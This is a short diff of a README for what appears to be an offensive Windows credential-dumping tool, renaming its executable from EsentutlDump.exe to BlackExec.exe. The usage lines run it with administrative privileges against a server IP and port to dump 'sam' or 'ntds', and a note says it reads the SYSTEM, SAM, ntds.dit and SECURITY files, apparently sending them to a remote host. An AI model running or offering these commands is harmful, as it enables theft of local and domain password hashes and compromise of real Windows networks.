@@ -24,9 +24,9 @@ dotnet build
 1. Run the compiled program with administrative privileges:
 
 ```
-EsentutlDump.exe <Server_IP> <Port> sam
+BlackExec.exe <Server_IP> <Port> sam
 
-EsentutlDump.exe <Server_IP> <Port> ntds
+BlackExec.exe <Server_IP> <Port> ntds
 ```
 
 **Note:** The program must be run with administrative privileges to access the SYSTEM, SAM, ntds.dit and SECURITY files.
